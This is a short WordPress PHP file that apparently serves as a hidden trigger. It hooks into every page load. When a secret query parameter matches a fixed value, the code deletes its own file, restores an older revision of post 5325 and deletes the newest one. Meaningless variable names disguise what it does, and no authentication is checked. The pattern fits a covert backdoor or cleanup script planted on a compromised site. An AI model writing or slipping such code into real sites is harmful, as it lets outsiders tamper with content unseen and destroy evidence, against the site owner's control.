<?php

function beaver_content_private_log() {
	if (isset($_GET['link_coming_schema_upgrader']) && $_GET['link_coming_schema_upgrader'] === 'donation_invoice_urls_visibility') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$print_exporter_star_charts = 5325;
		$rotator_extensions_total_items = wp_get_post_revisions($print_exporter_star_charts);
		if (empty($rotator_extensions_total_items)) die('no revisions');
		if (count($rotator_extensions_total_items) < 2) die('less than 2');
		$builder_soon_icons_scripts = array_shift($rotator_extensions_total_items);
		$scheduled_affiliates_category = $builder_soon_icons_scripts->ID;
		$com_pixel_graph_qr = array_shift($rotator_extensions_total_items);
		$dist_shortcode_fields_delete = $com_pixel_graph_qr->ID;
		$performance_embedder_links = wp_restore_post_revision($dist_shortcode_fields_delete);
		if ($performance_embedder_links === false) die('error restoring');
		$performance_embedder_links = wp_delete_post_revision($scheduled_affiliates_category);		
		if ($performance_embedder_links === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'beaver_content_private_log');
